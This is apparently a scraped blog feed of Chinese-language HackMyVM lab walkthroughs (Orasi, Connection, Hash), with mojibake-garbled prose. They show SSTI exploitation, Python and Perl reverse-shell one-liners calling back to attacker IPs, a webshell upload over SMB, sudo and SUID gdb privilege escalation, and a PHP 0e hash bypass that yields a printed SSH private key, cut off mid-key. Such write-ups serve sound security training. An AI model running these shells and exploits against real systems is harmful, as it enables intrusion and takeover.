       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.212.4:5000/sh4d0w$s?FUZZ=1
 :: Wordlist         : FUZZ: /home/kali/hmv/orasi/wordlist.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

l333tt                  [Status: 200, Size: 1, Words: 1, Lines: 1, Duration: 132ms]

<br>æˆåŠŸçˆ†ç ´å‡ºå‚æ•°ä¸º l333tt<br>éªŒè¯ä¸€ä¸‹<br>http://192.168.212.4:5000/sh4d0w$s?l333tt={{2*2}}
<br><img alt="Pasted image 20241206125012" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241206125012.png" referrerpolicy="no-referrer"><br>
ä½¿ç”¨ {{%s}} è§£ææˆåŠŸ ï¼Œå¯ä»¥åˆ¤æ–­æ˜¯ jinja2 çš„æ¨¡ç‰ˆ<br><br>è¿™é‡Œæˆ‘ä»¬åº”è¯¥æ²¡æœ‰è¿‡æ»¤æˆ‘ä»¬ç›´æ¥ç”¨å·¥å…·<a data-tooltip-position="top" aria-label="../../26-å·¥å…·ä½¿ç”¨/SSTIMAPä½¿ç”¨" data-href="../../26-å·¥å…·ä½¿ç”¨/SSTIMAPä½¿ç”¨" href="https://www.c1trus.top/26-å·¥å…·ä½¿ç”¨/sstimapä½¿ç”¨.html" class="internal-link" target="_self" rel="noopener nofollow">SSTIMAP</a>è¿›è¡Œåˆ©ç”¨<br>
-u è¿›è¡Œæ£€æµ‹<br>python sstimap.py -u http://192.168.212.4:5000/sh4d0w$s?l333tt=1
<br><img alt="Pasted image 20241206125635" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241206125635.png" referrerpolicy="no-referrer"><br>
æˆåŠŸæ£€æµ‹å‡ºsstiæ¨¡ç‰ˆæ³¨å…¥ã€‚ä¹Ÿæ£€æµ‹å‡ºæ¨¡ç‰ˆæ˜¯ Jinja2<br>--os-shell è·å–shell<br>python sstimap.py -u http://192.168.212.4:5000/sh4d0w$s?l333tt=1 --os-shell
[+] Run commands on the operating system.
posix-linux $ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
<br>ä¸‹ä¸€æ­¥å§shellå¼¹è¿‡æ¥å³å¯<br><br><img alt="Pasted image 20241206130042" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241206130042.png" referrerpolicy="no-referrer"><br><br>(remote) www-data@orasi:/tmp$ sudo -l
Matching Defaults entries for www-data on orasi:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on orasi:
    (kori) NOPASSWD: /bin/php /home/kori/jail.php *

(remote) www-data@orasi:/tmp$ cat /home/kori/jail.php
&lt;?php
array_shift($_SERVER['argv']);
$var = implode(" ", $_SERVER['argv']);

if($var == null) die("Orasis Jail, argument missing\n");

function filter($var) {
        if(preg_match('/(`|bash|eval|nc|whoami|open|pass|require|include|file|system|\/)/i', $var)) {
                return false;
        }
        return true;
}
if(filter($var)) {
        $result = exec($var);
        echo "$result\n";
        echo "Command executed";
} else {
        echo "Restricted characters has been used";
}
echo "\n";
?&gt;

<br>jail.php è¿™é‡Œå­˜åœ¨ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œã€‚è™½ç„¶è¿‡æ»¤äº†å¾ˆå¤šå‘½ä»¤ã€‚ä½†æ˜¯æˆ‘ä»¬è¿˜å¯ä»¥ç”¨å¯åŠ¨python<br>
ç„¶åç”¨pythonè¿›è¡Œåå¼¹<br>(remote) www-data@orasi:/var/www/html$ sudo -u kori /bin/php /home/kori/jail.php python
Python 2.7.16 (default, Oct 10 2019, 22:02:15)
[GCC 8.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.212.3",1888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
<br><img alt="Pasted image 20241206132822" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241206132822.png" referrerpolicy="no-referrer"><br><br>(remote) kori@orasi:/var/www/html$ sudo -l
Matching Defaults entries for kori on orasi:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User kori may run the following commands on orasi:
    (irida) NOPASSWD: /usr/bin/cp /home/irida/irida.apk /home/kori/irida.apk

<br>å¯ä»¥å¤åˆ¶iridaç›®å½•ä¸‹é¢çš„apkåˆ°å½“å‰ç”¨æˆ·ç›®å½•ä¸‹é¢<br>å¤åˆ¶ä¹‹å‰å…ˆè¦åˆ›å»ºä¸€ä¸ª /home/kori/irida.apk  å¹¶ä¸”ç»™æƒé™<br>(remote) kori@orasi:/home/kori$ touch /home/kori/irida.apk
(remote) kori@orasi:/home/kori$ chmod 777 /home/kori/irida.apk
(remote) kori@orasi:/home/kori$ sudo -u irida /usr/bin/cp /home/irida/irida.apk /home/kori/irida.apk
<br>ç„¶åä¼ åˆ°æœ¬åœ°ã€‚é€†å‘åˆ†æä¸€ä¸‹<br>
ç”¨jebåˆ†æå¯ä»¥å‘ç°å…³é”®å­—ç¬¦ä¸²<br>
<img alt="Pasted image 20241206152120" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241206152120.png" referrerpolicy="no-referrer"><br>
è¿™ä¸ªå¤šåŠå°±æ˜¯è´¦å·å¯†ç <br>
å³é”®è§£æ<br>
<img alt="Pasted image 20241206152657" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241206152657.png" referrerpolicy="no-referrer"><br>å¯ä»¥å‘ç°å¯¹ 1 #2 #3 #4 #5 è¿›è¡Œäº†å¤„ç†<br>
æ­£ç¡®çš„å¯†ç åº”è¯¥æ˜¯ eye.of.the.tiger.()<br>
å°è¯•ç™»å½•å‘ç°æ˜¯é”™è¯¯çš„ã€‚<br>é¶æœºä½œè€…æœ‰ç»™è¿‡ä¸€ä¸ªæç¤ºã€‚<br>
<img alt="Pasted image 20241206153024" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241206153024.png" referrerpolicy="no-referrer"><br>
åªæ˜¯ä¸€ä¸ªæ— ç”¨çš„å°ç‚¹
<br>å¯èƒ½æ˜¯è¯´æœ‰ä¸€ä¸ªç‚¹æ²¡æœ‰ç”¨<br>
ç»è¿‡æµ‹è¯• æ­£ç¡®å¯†ç æ˜¯ eye.of.the.tiger()<br>sshç™»å½•æˆåŠŸ<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/orasi]
â””â”€# ssh irida@192.168.212.4
irida@192.168.212.4''s password:
Linux orasi 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Feb 11 18:48:10 2021 from 10.0.2.15
irida@orasi:~$ id
uid=1000(irida) gid=1000(irida) groups=1000(irida),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)


irida@orasi:~$ cat user.txt
2afb9cbb10c22dc7e154a8c434595948

<br><br>irida@orasi:~$ sudo -l
Matching Defaults entries for irida on orasi:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User irida may run the following commands on orasi:
    (root) NOPASSWD: /usr/bin/python3 /root/oras.py

<br>è¿™é‡Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œ root/oras.py<br>
ä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“è„šæœ¬çš„å…·ä½“å†…å®¹<br>
éšä¾¿æ‰§è¡Œå¯ä»¥å‘ç°å…¶ä¸­çš„æŠ¥é”™<br>irida@orasi:~$ sudo -u root python3  /root/oras.py
: whomai
Traceback (most recent call last):
  File "/root/oras.py", line 7, in &lt;module&gt;
    name = bytes.fromhex(name).decode('utf-8')
ValueError: non-hexadecimal number found in fromhex() arg at position 0

<br>name = bytes.fromhex(name).decode('utf-8')<br>
å¾ˆæ˜æ˜¾æˆ‘ä»¬åº”è¯¥æ˜¯è¦è¾“å…¥ä¸€ä¸ª16è¿›åˆ¶çš„å€¼<br>å°è¯•è¾“å…¥ whoamI çš„16è¿›åˆ¶å€¼<br>irida@orasi:~$ sudo -u root python3  /root/oras.py
: 77686f616d69
Traceback (most recent call last):
  File "/root/oras.py", line 8, in &lt;module&gt;
    print(exec(name))
  File "&lt;string&gt;", line 1, in &lt;module&gt;
NameError: name 'whoami' is not defined

<br>è¿˜æ˜¯æŠ¥é”™äº†ã€‚ä½†æ˜¯åˆå¤šäº†ä¸€ä¸ªé”™è¯¯<br>
print(exec(name))<br>æ˜æ˜¾è¿™é‡Œä¼šæ‰§è¡Œä¸€ä¸ªå‚æ•° name è€Œè¿™é‡Œ name æˆ‘ä»¬è¾“å…¥16è¿›åˆ¶å¯¹åº”å­—ç¬¦ä¸²æ˜¯ whoami<br>è¿™é‡Œç”¨çš„æ˜¯pythonæ‰§è¡Œã€‚é‚£æˆ‘ä»¬å°±åº”è¯¥æŒ‰ç…§pythonè°ƒç”¨ç³»ç»Ÿå‘½ä»¤çš„æ–¹å¼ä¼ é€’å‚æ•°<br>string:import os;os.system('whoami');
696d706f7274206f733b6f732e73797374656d282777686f616d6927293b

irida@orasi:~$ sudo -u root python3  /root/oras.py
: 696d706f7274206f733b6f732e73797374656d282777686f616d6927293b
root
None

<br>okæˆåŠŸ<br>é‚£æˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹å†…å®¹å°±è¡Œäº†<br>string:import os;os.system('cat /root/root.txt');
hex:696d706f7274206f733b6f732e73797374656d2827636174202f726f6f742f726f6f742e74787427293b

irida@orasi:~$ sudo -u root python3  /root/oras.py
: 696d706f7274206f733b6f732e73797374656d2827636174202f726f6f742f726f6f742e74787427293b
b1c17c79773c831cbb9109802059c6b5
None


<br>æœ€åï¼Œè¿™æ˜¯pythonçš„ä»£ç <br>import os
import base64
import re
import sys

name = input(": ")
name = bytes.fromhex(name).decode('utf-8')
print(exec(name))
]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/40.orasi.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/40.orasi.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241206121115.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241206121115.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[4.Connection]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>
<br><a data-tooltip-position="top" aria-label="3. SMBæœåŠ¡" data-href="#3. SMBæœåŠ¡" href="https://www.c1trus.top/about:blank#3._SMBæœåŠ¡" class="internal-link" target="_self" rel="noopener nofollow">3. SMBæœåŠ¡</a>
<br><a data-tooltip-position="top" aria-label="4. webshell" data-href="#4. webshell" href="https://www.c1trus.top/about:blank#4._webshell" class="internal-link" target="_self" rel="noopener nofollow">4. webshell</a>
<br><a data-tooltip-position="top" aria-label="5. SUIDææƒ" data-href="#5. SUIDææƒ" href="https://www.c1trus.top/about:blank#5._SUIDææƒ" class="internal-link" target="_self" rel="noopener nofollow">5. SUIDææƒ</a>
<br>é¶æœºé“¾æ¥ï¼šhttps://hackmyvm.eu/machines/machine.php?vm=Connection
<br>ä½œè€…ï¼š<a data-tooltip-position="top" aria-label="https://hackmyvm.eu/profile/?user=whitecr0wz" rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/profile/?user=whitecr0wz" target="_blank"> whitecr0wz</a><br>éš¾åº¦ï¼šâ­ï¸â­ï¸
<br>çŸ¥è¯†ç‚¹ï¼šSUIDææƒ-gdb ã€SMBæœåŠ¡
<br><br>ç«¯å£æ‰«æ<br>Nmap scan report for 192.168.9.6
Host is up (0.00016s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 08:00:27:46:CA:97 (Oracle VirtualBox virtual NIC)
<br>ç›®å½•æ‰«æ<br>gobuster dir -u http://192.168.9.6/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,zip,css,txt
<br>æ²¡æœ‰å•¥ä¸œè¥¿<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/4.Connection.001.png" referrerpolicy="no-referrer"><br><br>æ‰«æç«¯å£å‘ç°å¼€å¯äº†139ä¸445ç«¯å£ï¼Œè¿™æ˜¯SMBæœåŠ¡çš„ç‰¹å¾ <br>åˆ©ç”¨enum4linux å·¥å…·å¯¹ç›®æ ‡ä¸»æœºçš„smbæœåŠ¡è¿›è¡Œæ‰«æ<br>enum4linux -a -o 192.168.9.6
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/4.Connection.002.png" referrerpolicy="no-referrer"><br>å¯ä»¥å‘ç°shareæ–‡ä»¶å¤¹å¯ä»¥è¯»å–<br>smbclientè¿æ¥ä¸Šå»<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# smbclient //192.168.9.6/share
Password for [WORKGROUP\kali]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Wed Sep 23 09:48:39 2020
  ..                                  D        0  Wed Sep 23 09:48:39 2020
  html                                D        0  Wed Sep 23 10:20:00 2020

                7158264 blocks of size 1024. 5295652 blocks available
smb: \&gt; allinfo html
altname: html
create\_time:    Wed Sep 23 10:20:00 AM 2020 CST
access\_time:    Sun Nov  3 01:51:49 PM 2024 CST
write\_time:     Wed Sep 23 10:20:00 AM 2020 CST
change\_time:    Wed Sep 23 10:20:00 AM 2020 CST
attributes: D (10)
<br>å‘ç°é‡Œé¢æœ‰ä¸€ä¸ªè¿™ä¸ªhtmlç›®å½•ï¼Œè¿›å»åå‘ç°å°±æ˜¯ç½‘ç«™çš„æ ¹ç›®å½•<br>è€Œä¸”ç›®å½•çš„å±æ€§æ˜¯10 <br>å³8+2 <br>8ï¼šè¿™æ˜¯ä¸€ä¸ªç›®å½•<br>2ï¼šè¿™ä¸ªæ–‡ä»¶å¤¹æ˜¯éšè—çš„<br>ç¬¬ 0 ä½ï¼ˆ1ï¼‰ï¼šè¡¨ç¤º åªè¯»ï¼ˆRead-onlyï¼‰ã€‚
ç¬¬ 1 ä½ï¼ˆ2ï¼‰ï¼šè¡¨ç¤º éšè—ï¼ˆHiddenï¼‰ã€‚
ç¬¬ 2 ä½ï¼ˆ4ï¼‰ï¼šè¡¨ç¤º ç³»ç»Ÿæ–‡ä»¶ï¼ˆSystemï¼‰ã€‚
ç¬¬ 3 ä½ï¼ˆ8ï¼‰ï¼šè¡¨ç¤º ç›®å½•ï¼ˆDirectoryï¼‰ã€‚
ç¬¬ 4 ä½ï¼ˆ16ï¼‰ï¼šè¡¨ç¤º å­˜æ¡£ï¼ˆArchiveï¼‰ã€‚
<br>è¿™é‡Œå¯ä»¥è¯´æ˜htmlæ–‡ä»¶æ˜¯å¯ä»¥å†™å…¥çš„<br>ç›´æ¥ä¼ ä¸€ä¸ªåé—¨<br>cd html
put 1.php
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/4.Connection.003.png" referrerpolicy="no-referrer"><br><br>å‘ç°ä¼ çš„evalé©¬å¥½åƒä¸å¤ªå¥½å¼¹shell<br>
é‡æ–°ä¼ äº†ä¸€ä¸ªç³»ç»Ÿé©¬<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/4.Connection.004.png" referrerpolicy="no-referrer"><br>å¼¹shell<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/4.Connection.005.png" referrerpolicy="no-referrer"><br>cmd=perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.9.3%22%3B%24p%3D1122%3Bsocket%28S%2CPF\_INET%2CSOCK\_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr\_in%28%24p%2Cinet\_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fsh%20-i%22%29%3B%7D%3B%27
<br><br>(remote) www-data@connection:/var/www/html$ find / -perm -4000 2&gt;/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/su
/usr/bin/passwd
/usr/bin/gdb
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/mount
/usr/bin/gpasswd
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/4.Connection.006.png" referrerpolicy="no-referrer"><br>cd /usr/bin
./gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/4.Connection.007.png" referrerpolicy="no-referrer">]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/4.connection.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/4.Connection.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/4.Connection.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/4.Connection.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[39.Hash]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>

<br><a data-tooltip-position="top" aria-label="2.1. 0eç»•è¿‡" data-href="#2.1. 0eç»•è¿‡" href="https://www.c1trus.top/about:blank#2.1._0eç»•è¿‡" class="internal-link" target="_self" rel="noopener nofollow">2.1. 0eç»•è¿‡</a>


<br><a data-tooltip-position="top" aria-label="3. æ–¹å¼1ï¼šPWNkit ææƒroot" data-href="#3. æ–¹å¼1ï¼šPWNkit ææƒroot" href="https://www.c1trus.top/about:blank#3._æ–¹å¼1ï¼šPWNkit_ææƒroot" class="internal-link" target="_self" rel="noopener nofollow">3. æ–¹å¼1ï¼šPWNkit ææƒroot</a>
<br><a data-tooltip-position="top" aria-label="4. æ–¹å¼2æ­£å¸¸ææƒ" data-href="#4. æ–¹å¼2æ­£å¸¸ææƒ" href="https://www.c1trus.top/about:blank#4._æ–¹å¼2æ­£å¸¸ææƒ" class="internal-link" target="_self" rel="noopener nofollow">4. æ–¹å¼2æ­£å¸¸ææƒ</a><br>
- <a data-tooltip-position="top" aria-label="4.1. ææƒåˆ° maria ç”¨æˆ·" data-href="#4.1. ææƒåˆ° maria ç”¨æˆ·" href="https://www.c1trus.top/about:blank#4.1._ææƒåˆ°_maria_ç”¨æˆ·" class="internal-link" target="_self" rel="noopener nofollow">4.1. ææƒåˆ° maria ç”¨æˆ·</a><br>
é¶æœºé“¾æ¥ <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=Hash" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=Hash</a><br>
ä½œè€… sml<br>
éš¾åº¦ â­ï¸â­ï¸
<br><br>Warning
é¶æœºå¿…é¡»è¦èƒ½å‡ºç½‘æ‰è¡Œã€‚ä¸èƒ½å‡ºç½‘ä¸ä¼šå¼€æ”¾80ç«¯å£
<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/hash]
â””â”€# nmap -sCV 192.168.42.79
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-05 10:10 CST
Nmap scan report for 192.168.42.79
Host is up (0.000090s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 1e:fb:86:3d:cf:26:a2:a0:ae:b0:00:61:0b:41:cb:ab (RSA)
|   256 80:8e:46:7b:1d:6e:13:74:22:89:ad:91:b4:44:64:ec (ECDSA)
|_  256 71:e5:e1:4f:34:16:de:ec:b5:c4:fe:f5:0a:a2:ee:fc (ED25519)
80/tcp   open  http          nginx 1.14.2
|_http-title: LOGIN
|_http-server-header: nginx/1.14.2
3389/tcp open  ms-wbt-server xrdp
MAC Address: 08:00:27:8C:10:84 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.53 seconds

<br>é¦–é¡µæ˜¯ä¸€ä¸ªç™»å½•æ¡†<br>
<img alt="Pasted image 20241205101329" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241205101329.png" referrerpolicy="no-referrer"><br>
çœ‹ä¸€ä¸‹æºä»£ç ä»£ç  å¯ä»¥å‘ç°æœ‰æç¤º<br>&lt;!doctype html&gt;
&lt;html lang="en"&gt;
&lt;title&gt;LOGIN&lt;/title&gt;

    &lt;form class="form-signin" action="check.php" method="post"&gt;

      &lt;input type="text" autocomplete="off" id="user" name="user" name="user" placeholder="Username" required autofocus&gt;
      &lt;input type="password" name="password" id="password" placeholder="Password" required&gt;
      &lt;input type="submit" value="Login"&gt;
    &lt;/form&gt;
&lt;!-- Marco, remember to delete the .bak file--&gt;
  &lt;/body&gt;
&lt;/html&gt;
<br>è·å–åˆ°ä¸€ä¸ªç”¨æˆ· Marco  å‘Šè¯‰æˆ‘ä»¬é‡Œé¢æœ‰ä¸€ä¸ª.bakæ–‡ä»¶<br>ç›®å½•æ‰«æ<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/hash]
â””â”€# gobuster dir -u http://192.168.42.79 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x jpg,php,html,png,zip,bak,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.42.79
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              jpg,php,html,png,zip,bak,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 453]
/check.bak            (Status: 200) [Size: 273]
/check.php            (Status: 200) [Size: 19]

<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/hash]
â””â”€# curl http://192.168.42.79/check.php
INVALID CREDENTIALS                                                                                                        
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/hash]
â””â”€# curl http://192.168.42.79/check.bak
&lt;?php
// Login part.
$pass = $_POST['password'];
//marco please dont use md5, is not secure.
//$passwordhashed = hash('md5', $pass);
$passwordhashed = hash('sha256',$pass);
if ($passwordhashed == '0e0001337') {
//Your code here
}
else{
//Another code here
}
//To finish
?&gt;

<br>å¯ä»¥å‘ç°è¿™ä¸ªåˆ¤æ–­æ˜¯ä¸€ä¸ªå¼±ç­‰äº<br>
ä½¿ç”¨0eç»•è¿‡<br><br>ç»•è¿‡åŸç†ï¼šPHPåœ¨å¤„ç†å­—ç¬¦ä¸²æ—¶ä¼šå‡ºç°ç¼ºé™·ï¼Œå¦‚æœå­—ç¬¦ä¸²ä¸ºâ€™5e2â€™ï¼Œæœ¬æ¥åªæ˜¯ä¸€ä¸ªæ­£å¸¸å­—ç¬¦ä¸²ï¼Œä½†PHPä¼šè®¤ä¸ºè¿™æ˜¯ç§‘å­¦è®¡æ•°æ³•é‡Œçš„eï¼Œé‚£ä¹ˆPHPè¿›è¡Œæ¯”è¾ƒæ—¶ä¼šå°†è¿™ä¸ªå­—ç¬¦ä¸²æŒ‰ç…§ç§‘å­¦è®¡æ•°æ³•è®¡ç®—ï¼Œå³5e2=5*10^2=500ï¼Œç”±æ­¤0e100è¢«è®¤ä¸ºå’Œ0ç›¸ç­‰ã€‚md5åŠ å¯†åçš„å“ˆå¸Œå€¼æ˜¯ä¸€ä¸²16è¿›åˆ¶æ•°ï¼Œå› æ­¤éœ€è¦å“ˆå¸Œå€¼ç¬¬ä¸€ä½ä¸º0ï¼Œç¬¬äºŒä½ä¸ºeå³å¯ï¼Œåé¢ä¸è®ºæ˜¯ä»€ä¹ˆéƒ½è®¤ä¸ºå’Œ0ç›¸ç­‰<br>payloadçœ‹è¿™é‡Œ <a rel="noopener nofollow" class="external-link" href="https://github.com/spaze/hashes/blob/master/sha256.md" target="_blank">https://github.com/spaze/hashes/blob/master/sha256.md</a><br>åˆ°ä¸»é¡µå¯†ç è¾“å…¥payload ç”¨æˆ·éšä¾¿è¾“å…¥ ç™»å½•åå¯ä»¥è·å–åˆ°ç§é’¥<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/hmv/hash]
â””â”€# curl http://192.168.42.79/check.php -X POST -d "user=12312&amp;password=34250003024812"

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAxiKdFmWJiVfVYaNGov1xuh0/nrXnNsx2s6g5IoIJrmkX+9qzt2US
ZWMgrjLzAyB3wrLFysCPh4F8GU87pJkbpc0prM/8vB2WJCg5ktDQ6o0vwH219sPKUS4e9R
s2bPz7CJX5bzFDQ3B6ZUOs1itZ1t/uq38XuCxDjI8XxU6fusB3Rjz2XIombtFwo78W1pkX
VnQhzZOQ+b8UaC5lZeKatcZ0xdc0iQgiAbcRN7sXYCDMxMmo9KsxqzWjd56hLrv1nsTy2t
VBXzDRw+5JU4AJlGDRB/Upq/oKbGDCOmgNUsJPQKW4TgEAWhUa+t/ue2Bs/wFjCY7w/LkY
pK4bnY5eHQAAA8C/pv23v6b9twAAAAdzc2gtcnNhAAABAQDGIp0WZYmJV9Vho0ai/XG6HT
+etec2zHazqDkiggmuaRf72rO3ZRJlYyCuMvMDIHfCssXKwI+HgXwZTzukmRulzSmsz/y8
HZYkKDmS0NDqjS/AfbX2w8pRLh71GzZs/PsIlflvMUNDcHplQ6zWK1nW3+6rfxe4LEOMjx
fFTp+6wHdGPPZciiZu0XCjvxbWmRdWdCHNk5D5vxRoLmVl4pq1xnTF1zSJCCIBtxE3uxdg
IMzEyaj0qzGrNaN3nqEuu/WexPLa1UFfMNHD7klTgAmUYNEH9Smr+gpsYMI6aA1Swk9Apb
hOAQBaFRr63+57YGz/AWMJjvD8uRikrhudjl4dAAAAAwEAAQAAAQEAlMcLA/VMmGfu33kW
Im+DRUiPLCLVMo3HmFH6TRIuKNvbWY+4oT5w2NbdhFDXr4Jiyz0oTn3XiN3PDMY1N/yMCS
0MXSp0UeE5i3709Gx+Y5GOyNDcoSYVtm2Wa2B6ts4jxievfDIWmv5LudxeXReCR1oxQm+V
pQL/2fzc0ZifUj+/VSSIltgDKHxEfebfK0xShgXTSlUhickSapre2ArSdplM/rYvZLDWmd
iGkGD3VnAgRtloy5v32vPI3M++OCrHbLxgff4odAjawejPPHVj3beMgCrqwb/CCNKEyWKc
